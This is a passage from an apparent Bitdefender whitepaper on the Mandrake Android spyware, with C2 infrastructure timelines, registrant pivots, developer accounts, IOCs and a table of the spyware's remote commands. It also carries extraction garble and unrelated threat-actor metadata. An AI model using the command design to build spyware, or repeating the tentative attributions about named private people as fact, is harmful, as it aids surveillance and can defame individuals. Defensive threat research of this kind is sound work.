namecheap/zomro.com\n\n\n2017-12-28 xjkbhysexthnpl.top Domain deleted\n\nTimeline livingstream.mobi\n\n\n2016-12-14 livingstream.mobi Domain registered through namecheap/zomro.com\n\n2016-12-14 livingstream.mobi Domain points to 185.51.246.111\n\n2018-01-25 livingstream.mobi Domain deleted\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n\n2019-08-23 androidfirmware.top Domain registered through namecheap/cloudns.net\n\n2019-10-04 androidfirmware.top Domain points to 94.228.219.76\n\n2019-11-16 androidfirmware.top Domain points to 159.69.66.184\n\n\nFrom this data we can extract new data points and pivot further from there. We’ve collected additional email addresses\nand IP addresses. So let’s create a table that can tell us something about the geographical location of the command and\ncontrol servers based on the IP address over time.\n\nTimeframe 2016-02-11 to Now\n\nKnown CnC IP Addresses\n\n**Date** **Domain** **IP Address**\n\n\n2016-02-13 rendfiles.top 209.44.113.1\n\n2016-04-09 androidfrimware.com 95.215.45.59\n\n2016-10-01 android-soft.top 209.44.113.1\n\n2016-10-31 android-soft.top 104.193.252.166\n\n2016-11-17 nfmmlrkagflemt.top 185.51.246.111\n\n2016-12-14 livingstream.mobi 185.51.246.111\n\n2017-01-19 rendfiles.top 104.193.252.166\n\n2018-06-21 android-soft.top 185.67.2.87\n\n2019-01-09 android-soft.top 95.154.195.40\n\n2019-09-27 androidfirmware.ca 94.228.219.76\n\n2019-10-04 androidfirmware.top 94.228.219.76\n\n2019-11-16 androidfirmware.top 159.69.66.184\n\n2019-11-28 androidfrimware.com 185.51.246.111\n\n\n2019-11-29 androidfirmware.ca 159.69.66.184\n\nFrom the above picture we can clearly see that infrastructure is shared over all domains and ip addresses.\n\nDetails about CnC server 209.44.113.1 (2016-02-13 – 2017-01-19)\n\n\n2016-02-13 rendfiles.top\n\n\n2016-10-01 android-soft.top\n\nDetails about CnC server 95.215.45.59 (2016-04-09 – 2019-11-28)\n\nWhile looking at this CnC server, a new domain pops up: appleupdatecheck.com. We suspect this domain is related to\nthe operation because of the close proximity of the confirmed **androidfrimware.com domain and appleupdatecheck.**\n**com domain. If we look one step further in the IP range, we see another interesting domain: “icloudbackupsync.com”.**\nThis domain was registered on precisely the same day as appleupdatecheck.com. Unfortunately, we have not been able\nto determine what these domains have been used for.\n\nDetails about CnC server 104.193.252.166 (2016-10-31 – 2018-06-21)\n\n\n2016-10-31 android-soft.top\n\n2016-11-08 andersonross.info\n\n2016-11-12 josolyne.net\n\n\n2017-01-19 rendfiles.top\n\nh b bl d h h b l h l d f d\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\njosolyne.net.\n\nDetails about CnC server 185.51.246.111 (2016-11-17 – Now)\n\n\n2016-11-17 nfmmlrkagflemt.top\n\n2016-12-14 livingstream.mobi\n\n2019-11-28 androidfrimware.com\n\n\n2020-01-06 androidev.host\nFrom the above table we can see that this Command and Control server has been used throughout the whole operation\nfor 4 years.\n\nDetails about CnC server 185.67.2.87 (2018-06-21 – 2019-01-09)\n\n\n2017-03-06 soft-android.org\n\n2018-02-11 android-soft.top\n\n2018-06-25 money-mod.mobi\n\n\nDetails about CnC server 95.154.195.40 (2019-01-09 – Now)\n\n\n2019-01-09 android-soft.top\n\n\nDetails about CnC server 94.228.219.76 (2019-09-27 – Now)\n\n\n2018-11-20 cryptocast.guru\n\n2018-12-05 greengpslantern.com\n\n2019-03-24 coincast.dev\n\n2019-09-27 androidfirmware.ca\n\n2019-10-04 androidfirmware.top\n\n\nDetails about CnC server 159.69.66.184 (2019-11-16 – Now)\n\n\n2019-11-16 androidfirmware.ca\n\n\n2019-11-29 androidfirmware.top\n\nThis information has helped us find additional domains that might be related to this threat. Let’s now look at who\nregistered those domains and see if we can pivot further with those registration details:\n\n**Domain** **Registrant Email** **Registrant Name** **Registrant Phone**\n\n\nandroidfirmware.top PrivacyProtect\n\nandroidfirmware.ca ravi-maturi@hotmail.com - \nandroid-soft.top petrillarionov2034@mail.com\n\nmoney-mod.mobi PrivacyProtect\n\nsoft-android.org PrivacyProtect\n\nandroidev.host PrivacyProtect\n\nandroidfrimware.com Privacyprotect\n\nlivingstream.mobi PrivacyProtect\n\nnfmmlrkagflemt.top Privacyprotect\n\nandersonross.info kcbfbqdd@10mail.org Chelsea Wrathchild +1.4029341043\n\njosolyne.net PrivacyProtect\n\nrendfiles.top joernmortensen@mail.com - +1.4254452044\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nWith this new information we can pivot even further and see if we can find additional domains that have been registered\nwith either the same registrant email address, registrant name or phone number.\n\n**Item** **New Domains**\n\n\nravi-maturi@hotmail.com 15\n\npetrillarionov2034@mail.com 100+\n\nkcbfbqdd@10mail.org 5\n\nChelsea Wrathchild 29\n\n+1.4029341043 47\n\njoernmortensen@mail.com 387\n\n+1.4254452044 384\n\n\n[If we look at the ravi-maturi@hotmail.com](mailto:ravi-maturi@hotmail.com) entity we see that a lot of Iranian TLD domains have been registered through\nthat account between 2010 and 2019. The domain parnik.ir for example points to some malware from 2014 and the\ndomain click-explorer.ir point to some PDF exploits [7]. It is unclear to us whether these threats are related or whether the\nemail account has been abused or shared between actors.\n\nIf we look at the kcbfbqdd@10mail.org email address, we see that a lot of seemingly ‘professional’ company names have\nbeen registered:\n\n- andersonross.info\n\n- champion-accountants.info\n\n- glendrummond.info\n\n- ltaccountants.info\n\n- msfassociates.info\n\nWe don’t know exactly what these domains have been used for.\n\nWith the registrant name “Chelsea Wrathchild” we find even more ‘professional’ looking names and since the end of\n2016 a number of seemingly DGA generated domains. The DGA generated domains point to ransomware campaigns. It\nis unclear to us if these campaigns are related to the same threat actor.\n\nThe email address joernmortensen@mail.com was used to register 387 domains. If we look at those domains we see that\noften a normal word is used and 4 to 5 random letters are added behind it using the .top, .win and .xyztlds. Some of those\ndomains are related to malware and more specifically to the first Android ransomware strains of SLocker.\n\nInteresting domains for _petrillarionov2034@mail.com we find several similar TLD domains, and somehow using same_\nkeywords: adobe-updapp.top, updatesmobilebits.top, flashplayerupdateapk.top.\n\n### Insights into developers’ accounts\n\nFor the current attack wave, we have the following developers on Google Play:\n\n**application** **developer** **email**\n\n\ncom.coincast.app CoinCast© coincastdev@gmail.com\n\norg.currency.xeconverter Christopher Bankson christopher.bankson@gmail.com\n\nqr.office.scanner ArmDev. offscannerdeveloper@gmail.com\n\nsnap.tunemedia.maker FontS fontmania2019@gmail.com\n\ncom.astro.zodiac SigmaTech lohma4even@gmail.com\n\n\ncom.dark.chameleon SigmaTech lohma4even@gmail.com\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nOf all the above accounts, the publisher of the currency converter application seems more promising for research.\n\nWe know that Christopher Bankson‘s account is the developer/publisher of the currency converter application. It is not\npossible to publish an application on Google Play store without access to the publishing e-mail account.\n\nIndeed, the following ideas are based on information found on the internet that is linked in some form with the account\nused to publish Mandrake. It is possible that this account was stolen, and the stories are not related.\n\nChristopher’s account, or at least the same email address, is allegedly an employer in Canada, with different jobs, affiliated\nwith different companies.\n\nBack in 2017, he was searching for a receptionist/customer service representative with the following skills needed:\n\n_“Ability to multi-task with several projects successfully. Proven skills in Microsoft office suite (outlook, word, excel, power_\n_point. Typing skills at least 35-45 wpm. Proven successful customer service skills. Effective prioritizing abilities. Strong ability_\n_to communicate in a positive, clear & effective manner.” [1]_\n\nJob is posted in Toronto, Ontario, Canada. It’s a part-time job, seemed to be a small company. [1]\n\nBankson was also looking for a payroll manager, back in 2016, when Mandrake started. It seems they were looking for\nan experienced manager, as the job description stated: “Our Client is a global organization and they are now seeking an\n_experienced Payroll Manager to cover a long service leave assignment.” Job available in Saskatoon, Canada [2]_\n\nSearching for domains registered under Bankson’s e-mail address, we find two interesting companies were registered:\n\n- corso-it.com  2017-05-25  PDR LTD. D/B/A PUBLICDOMAINREGISTRY.COM\n\n  - DNS SOA points to a Russian registrar\n\n- duetteco.org  2017-10-11  NETEARTH ONE INC. D/B/A NETEARTH\n\n**CORSO IT CONSULTING INC, allegedly based in Montreal, Quebec, Canada and Wisconsin, Milwaukee. As they stated,**\n_“We are a consulting firm with a focus on business effectiveness, advice solutions, advice technologies (such as XPLAN,_\n_COIN), websites and custom solutions.”._\n\nAbout their clients, we find that:\n\n_“Our clients range from the largest successful advice businesses to smaller boutique ones across Canada. Discover why our_\n_clients have chosen CORSO as their preferred advice and technology partner of choice.” [3], [4]_\n\nRegarding their activity we have:\n\n_“Our consultants will expand your XPLAN IQ, and open opportunities to maximise the value of your XPLAN throughout your_\n_business. We deliver market leading solutions in SoA generation, configuration designs. 3rd party integrations, and bespoke_\n_custom add-ons. We design and build engaging websites which work on all devices, or provide you with the DIY tools and skills_\n_to manage your own. Go beyond the capabilities of your software with our custom solutions that will seamlessly integrate_\n_with your advice tools and processes.” [3], [4]_\n\nInterestingly, Better Business Bureau (BBB) tells us about CORSO IT that the location address provided seems to be fake,\nwhile CORSO IT does not have locations in Montreal or Wisconsin, according to the Department of Financial Institutions\n(WDFI.org).\n\nBuilding management confirmed that CORSO IT is not and has never been a tenant of the building, and they never heard\nof this company. (according to BBB, source [4])\n\n**DUETTECO INC. IT AND CLOUD SOLUTIONS COMPANY**\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nBack in 2017, this looks like an identity theft of a real company that is not related to IT solutions. For the fake one, they\nprovide the following services:\n\n_“DUETTECO delivers cutting edge support services to organizations across Canada & USA. Discuss your requirements with_\n_our team today.”_\n\nAccording to Better Business Bureau (BBB), this company is illegitimate and seems to be operating an employment scam,\ninstructing you to deposit some amount in cash. [5], [6]\n\nBankson has (probably) a fake Google Profile photo, linked with a person from Grodno, Belarus.\n\nSeems we are dealing with a person or multiple persons that evolved from different fake service provider scams to a\nwell-developed spyware/stealing malware platform.\n\nLooking at all this information, fake company scams may have stopped in 2017, probably a year after a more profitable\nbusiness started - a spying platform with activity spreading over a 4-year range. These companies also may have been\ncreated to launder money obtained through illegal malware activities.\n\nAnother promising lead into the nature of the organization behind Mandrake can be seen by following the alleged\ndeveloper SigmaTech behind the Horoskope, Car News and the older version of Mandrake that was already removed\nfrom Google Play, Abfix.\n\n[On the Google Play pages corresponding to these applications, we see in the details section that a lohma4even@gmail.](mailto:lohma4even@gmail.com)\n[com (LohmachevEvgenij) is noted as the developer and the blog http[:]//abfix-app.blogspot[.]com/ is provided for the](mailto:lohma4even@gmail.com)\nPrivacy Policy.\n\nLohmachev appears to be a Russian freelancer developer\n\n- [https://www.freelancer.com/u/lohma4even](https://www.freelancer.com/u/lohma4even)\n\n- [https://kwork.ru/user/lohma4even](https://kwork.ru/user/lohma4even)\n\nIt would seem that, to further spread Mandrake, he offered to pay people to download his applications from Google Play\n[https://kwork.ru/projects/336483](https://kwork.ru/projects/336483)\n\nTranslation of the post roughly is I’ll buy organic/real installations of my application on Google Play\n\nEach download would be paid 500 rubles (about 6 US dollars at current exchange rates). Considering that anybody who\nwould take up the project would actually be giving to Mandrake developers a lot more in exchange, it would seem a good\ndeal for the malicious developers.\n\nThe blog post hosting the Privacy Policy is written both in Russian and in English and a total of 4 Privacy Policies are\nhosted here, corresponding to 4 different Mandrake applications. We list them with the date the policy was uploaded, as\nfollows:\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n- 2019.05 Horoskop - com.astro.zodiac\n\n- 2019.08 Yatubemate - we could not locate this application\n\n- 2019.09 Car News - com.dark.chameleon\n\nAll the other Mandrake applications on Google Play have an individual blog for privacy statements.\n\nAlso interesting is that Google Play developer SigmaTech and CoinCast share the same certificate, which is used to sign\nthe apps. This indicates that SigmaTech and CoinCast are the same developers (or one has the key stolen).\n\nThere are versions where, interesting enough, the threat actors often chose to add or remove Russia and Kazakhstan.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n## Appendix A: MITRE matrix\n\nWhen mapping Mandrake functionality to MITRE standards we have:\n\n**Initial** **Persistence** **Defense** **Credential** **Discovery** **Impact** **Collection** **Exfiltration** **Command and Control**\n**Access** **Evasion** **Access**\n\n[T1444](https://attack.mitre.org/techniques/T1444) [T1401](https://attack.mitre.org/techniques/T1401) [T1406](https://attack.mitre.org/techniques/T1406) [T1411](https://attack.mitre.org/techniques/T1411) [T1418](https://attack.mitre.org/techniques/T1418) [T1446](https://attack.mitre.org/techniques/T1446) [T1412](https://attack.mitre.org/techniques/T1412/) [T1436](https://attack.mitre.org/techniques/T1436/) [T1436](https://attack.mitre.org/techniques/T1436/)\n\n[T1475](https://attack.mitre.org/techniques/T1475) [T1402](https://attack.mitre.org/techniques/T1402) [T1407](https://attack.mitre.org/techniques/T1407) [T1412](https://attack.mitre.org/techniques/T1412) [T1422](https://attack.mitre.org/techniques/T1422) [T1447](https://attack.mitre.org/techniques/T1447) [T1417](https://attack.mitre.org/techniques/T1417) [T1532](https://attack.mitre.org/techniques/T1532) [T1509](https://attack.mitre.org/techniques/T1509)\n\n[T1476](https://attack.mitre.org/techniques/T1476) [T1418](https://attack.mitre.org/techniques/T1418) [T1417](https://attack.mitre.org/techniques/T1417) [T1426](https://attack.mitre.org/techniques/T1426) [T1448](https://attack.mitre.org/techniques/T1448) [T1430](https://attack.mitre.org/techniques/T1430) [T1520](https://attack.mitre.org/techniques/T1520)\n\n[T1446](https://attack.mitre.org/techniques/T1446) [T1517](https://attack.mitre.org/techniques/T1517) [T1430](https://attack.mitre.org/techniques/T1430) [T1516](https://attack.mitre.org/techniques/T1516/) [T1432](https://attack.mitre.org/techniques/T1432) [T1521](https://attack.mitre.org/techniques/T1521)\n\n[T1508](https://attack.mitre.org/techniques/T1508) [T1523](https://attack.mitre.org/techniques/T1523) [T1433](https://attack.mitre.org/techniques/T1433)\n\n[T1516](https://attack.mitre.org/techniques/T1516) [T1513](https://attack.mitre.org/techniques/T1513)\n\n[T1523](https://attack.mitre.org/techniques/T1523) [T1517](https://attack.mitre.org/techniques/T1517/)\n\n## Appendix B: IOCs\n\n**Mandrake APK MD5**\n\n\n01f54e3f381fa74ea6202a0eede3336c 769c2f941deb6ebce0ea67d4445ae686\n\n097ba092ecb90bfe3de50ee0d296e079 79780744c5366fa31c5473d57341d6b5\n\n0ba9a201cb420f67d2411c16e72551ff 7c36d69856ad51b9644e4de02e7ef12b\n\n0c33df55396c7302e825e4cdf9d71963 7d3d1aed89bcbf3a6283c7afd5fffe68\n\n102fa3c42f49e76739330c207eb74764 854fe13515a5e16f725ad581bc42a3ca\n\n130678c900e987dc864656675719947a 85eb7327fd01a993aee0e5d830cb04f1\n\n134a27b776651dbe4aeec86067e715c0 86958a2fde23133447f8e5a05d7219d7\n\n139f0b8de9e5829177e7faf5ce626f10 89c35d03187db85247bb2602eceeb186\n\n1437bd4e45ea57cb68599554a2c9ad6d 9b37458884e0d031ed779f1e666a8aee\n\n1767056dca77c780fbdc8396387756a6 9e09467a00daa9c8b0e2293165f6237c\n\n17e431ead516a6308b6a8c94a2e0932d a33b07b15d76dd2fc74a065260341b56\n\n1c1f6aaeb8759ce0323603d4d278838d ad4f00bb107a5e83cde80f34fcc083f3\n\n1c2d6b31ba319c0eac60058da0ad7bf1 adec9bbd315ffcaf4867bc5b4f6a71c3\n\n2225f2be8c32f2a5b5cefe418098e4d4 b2ffb1f6a756e3baddf2151032392d8b\n\n238f1ca8731b923195c78e8685fbc996 b6b80f05de5d4394deeb8a6fe33fba97\n\n2533667dc05ed5961ebeb0287d1354c0 bffba259b7430d5324c6509b3f92c0a3\n\n28e8166a7603d293b515f2ca3d16d5cc c87c13d18c560830fa048483cfc1470f\n\n2c1074b092fad0a1c26ee7790501acf1 cd3cb091edd1b143650a5bf17115cf79\n\n2d8f3f410f5dfd9850e7240e7a671684 d1c6524bc9bafdaab159a2402b9e5056\n\n2ddb55736a6696f3f66b10c2fffbacde d9a111725120da98c2fa4624dffc0372\n\n31c8fe0d84cda9c2f1fcf906b4825a29 da643fca4cc765b2734754b70499af66\n\n31dbda64ab6dc67fcf43dd8172c068d7 db77f622dd20d4540d4260c966f0ea16\n\n3c3520eebbe93ab132e01f69a17fff37 dc30977eb044d461d75b4073df965504\n\n480084bff2bbe50d8282e54433a1477e dcab3899303a486569a01678b4e9aefd\n\n50653e594d8019f72303978ea0e448fa dcc510fbaedaa53713bf7524b6f4449f\n\n59da03ef4c7b6c32e341c1a2ce6c26e9 dd5868cf6eaa2fcf966fd308e89aaba5\n\n62939e26abdf183888eb7c7a83a5d76f e25f9a9e1176b51ac495198c20e0b6c1\n\n\n67d5a90767150d0da9cb8c7d7c5d59cd e72a988e51a3d5e48c14838f2a3a9c94\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Mandrake APK MD5**\n\n\n6e42fef0aaf514a840a83443be12c28a f73029781509f958d722b9aa76e4567e\n\n73403d4e492cc9ef2b849fc74b47a27f fe42978bc27e90427e3759ade882d293\n\n761ce5e1ad67b5ea59d643969fa46f1d ff967badd3681b332af5d0e8b20db2c3\n\n\n**Mandrake domains**\n\n\nandroidfirmware.ca\n\nandroidfirmware.cc\n\nandroidfirmware.ir\n\nandroidfirmware.top\n\nandroidfrimware.com\n\nandroid-soft.top\n\nlivingstream.mobi\n\nnfmmlrkagflemt.top\n\nrendfiles.top\n\n\nxjkbhysexthnpl.top\n\n## Appendix C: client commands\n\nAll CnC commands come with two parameters: the data_1 and data_2 fields of the response message; their meaning\ndepends on the command and is described in the third column of the table below. For most commands, one or both\ncan be the empty string. Some commands have more than two parameters, in those cases multiple parameters are\naggregated under data_1, data_2 and are vertical bar separated.\n\n**Code** **Name** **Description**\n\n\n1000 Get SMS Get received SMSes: on each received SMS a request will be made to the\nserver containing the SMS contents.\n\n1001 Block SMS Block all received SMS-es, do not show them to the victim. To be able to do\nthis, the app needs to be the default SMS handler.\n\nIf data_1 is not empty all received messages will be relayed to that phone\nnumber. All received SMS-es will be sent over to this number having the format\n“from|msg_body”.\n\n1002 Set contact rate Make client contact server every data_1 seconds.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Code** **Name** **Description**\n\n\n1003 Start phishing\nFactory reset\nReboot\n\n\nThis command does multiple things depending on the subcommand code\nused.\n\nThe general format for data_1 is:\n\n**package_name|alert_url|alert_title|alert_message|alert_cnfrm_msg**\n|alert_cmd|alert_retry_interval|alert_recorder_link|alert_duration\nDepending on the alert_cmdvalue one of the following happens:\n\n- 11: if package_name is nstalled, create notification with package_name,\n**alert_title, alert_msg. Also create a dialog with alert_title, alert_msg, alert_**\n**cnfrm_msg. Dialog is not cancelable. When the notification is pressed, or**\nthe dialog closed then package_name is started. The page at alert_url will\nbe displayed.\n\n(See the Phishing at its best – credential stealing and more section\n\nfor how the phishing mechanism works.)\n\n- 13: - if package_name is sepukku, and if the app is device admin then do a\nfactory reset.\n\n- 22: - show alert dialog with alert_title, alert_msg, alert_cnfrm_btn_msg,\ndialog not cancelable. Create reboot notification. It instructs the user to do\na reboot of the device.\n\n\n1004 Stop phishing Cancel alert, stop the JavaScript injection\n\n1005 Send phone Create server request with details of all programs running, firebase token, and\ndetails device accounts.\n\n1006 Send log Send the l.dat logfile to the server.\n\n1006 Send log & Send the logfile to the server. After it has been sent it is truncated to zero\ntruncate it length.\n\n1007 Change Clear all previous domains and uses new domains in data_1, also generates\ndomains random ones (DGA).\n\n1008 Enable SMS Sets Mandrake as default SMS handler. This is needed to be able to block,\nfunctionality intercept, relay incoming messages.\n\n1009 Disable SMS SMS logging/blocking will be disabled\nfunctionality\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Code** **Name** **Description**\n\n1010 Upgrade Download a new component or update existing one.\ncomponent\n\nThe format of data_1 is\n\n**package_name|title|message|confirm_btn_text|update_retry_interval**\ndata_2 is similar:\n\n**dld_ip|dld_host|dld_url|dld_md5|cmd**\nThe malware will attempt to connect to dld_host and use dld_url to specify\nwhich file to download. After downloading dld_md5 is used to check the\nintegrity.\n\n**package_name, tile, message, confirm_btn_text are used to display an alert**\ndialog to the user, but only in the case of the dropper component.\n\n**update_retry_interval tells it how often to retry to download/install update, in**\nseconds\n\nThe cmd field is specific to the component type being sent the command. So\nfar, we’ve seen 1, for droppers, and 3, for loaders.\n\nThe protocol used for downloading is described under the Communication\n_protocol: component download section._\n\n1011 Remove When sent to a component, this command will remove the next component\nupgrade in chain that was installed by it, i.e.: sent to a dropper this will attempt\nuninstalling the loader app, sent to the loader this will remove the core\ncomponent.\n\nThe loader app cannot be uninstalled if device admin rights were given to it\nwith command 1022, however.\n\n1012 Send all SMS Get all received SMS-es so far and send to the server\n\n1013 Force ping Force client ping, force 1000 client requests\n\n1014 Call number Initiate a call to phone number given in data_1\n\n1015 Toggle call Set call blocking on/off. If data_1 is 1 then calls will be blocked, 0 turns\nblocking blocking mode off\n\n1016 Send SMS with Send a text message to phone number in data_1 with the UID of the victim\nUID\n\n1017 Send SMS Send a text message with the content given in data_2 to phone number in\n**data_1**\n\n1018 Start VNC Control victim, VNC like functionality.\n\nA WebSocket connection will be made to the URL given in data_1. Over this\nconnection commands to control the device will be given by the server, the\nclient sends live screenshots effectively streaming the screen.\nSee the Losing total control section for details.\nCommand is valid for data_2 seconds.\n\n1019 Stop VNC Stop controlling the victim.\n\n1020 Start phishing Record webview activity and inject malicious javascript to steal form input.\nThis seems to be an alias for the 1003 command with the 11 subcommand\ncode\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Code** **Name** **Description**\n\n\n1021 Stop phishing Stop webview.\n\n1022 Permission Start nagging the user to give accessibility service permissions to the app.\nrequest\n\nSee User manipulation - CAD payloads section.\n\n1023 Stop perm Stops the above command.\nrequest\n\n1025 Start activity Start <packagename>:<activity> where packagename, activity are data_1,\n**data_2 respectively. Both fields are required.**\n\n1026 Restart app Restart the malware component.\n\n1027 Hide launcher This command has been spotted with the ricinus branch of Mandrake only.\n(ricinusonly) It will do a check if the user isn’t a bot. If successful will change the launcher\nicon to an inconspicuous one.\n\n1028 Start recording Start recording application(s) with package name given in data_1 when it is\napp foreground. Upload with POST request to URL given in data_2. Multiple apps\nmay be comma separated.\nThis is very similar to the 1003 command with the 11 subcommand code but\nno webview injection takes place.\n\n\n1029 Stop recording Stop screen recording\napp\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n## Bibliography\n\n[[1] www.i-hire.ca/jobs/receptionistcustomer-service-representative/](https://www.i-hire.ca/jobs/receptionistcustomer-service-representative/)\n\n[[2] www.saskjobs.ca/jsp/joborder/detail.jsp?job_order_id=715992](https://www.saskjobs.ca/jsp/joborder/detail.jsp?job_order_id=715992)\n\n[[3] web.archive.org/web/20170805102206/http://corso-it.com/About.html](https://web.archive.org/web/20170805102206/http://corso-it.com/About.html)\n\n[[4] www.bbb.org/us/wi/milwaukee/profile/information-technology-services/corso-it-consulting-0694-1000026497/](http://www.bbb.org/us/wi/milwaukee/profile/information-technology-services/corso-it-consulting-0694-1000026497/details)\n[details](http://www.bbb.org/us/wi/milwaukee/profile/information-technology-services/corso-it-consulting-0694-1000026497/details)\n\n[[5] www.bbb.org/ca/on/toronto/profile/not-elsewhere-classified/duetteco-inc-spoofer-imposter-0107-1356048](http://www.bbb.org/ca/on/toronto/profile/not-elsewhere-classified/duetteco-inc-spoofer-imposter-0107-1356048)\n\n[[6] www.bbb.org/ca/on/toronto/profile/home-accessories-online/duetteco-inc-0107-1356049](http://www.bbb.org/ca/on/toronto/profile/home-accessories-online/duetteco-inc-0107-1356049)\n\n[[7] www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Exploit%3aWin32%2fPdfjsc.EP](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Exploit%3aWin32%2fPdfjsc.EP)\n\n\n-----\n\n##### Proudly Serving Our Customers Dedicated To Our +20.000 Worldwide Partners\nBitdefender provides solutions and services for small business and A channel-exclusive vendor, Bitdefender is proud to share success with tens of\nmedium enterprises, service providers and technology integrators. We take thousands of resellers and distributors worldwide.\npride in the trust that enterprises such as Mentor, Honeywell, Yamaha,\n**Speedway, Esurance or Safe Systems place in us.** _CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud_\n\n_Partner, 2nd year in a Row_\n\n_Leader in Forrester’s inaugural Wave™ for Cloud Workload Security_\n\n_More MSP-integrated solutions than any other security vendor_\n\n_NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test_\n\n_3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers_\n\n_SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in_ _and hybrid partners – to focus on selling Bitdefender solutions that match their own_\n_a Row_ _specializations_\n\n_Gartner® Representative Vendor of Cloud-Workload Protection Platforms_\n\n##### Trusted Security Authority\nBitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with\n**VMware, Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.**\n\nThrough its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies\nsuch as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019,\nBitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.\n\n**RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS** **TECHNOLOGY ALLIANCES**\n\n##### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY**\n| Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona,\nSPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.bitdefender.com/files/News/CaseStudies/study/329/Bitdefender-PR-Whitepaper-Mandrake-creat4464-en-EN-interactive.pdf"
    ],
    "report_names": [
        "Bitdefender-PR-Whitepaper-Mandrake-creat4464-en-EN-interactive.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
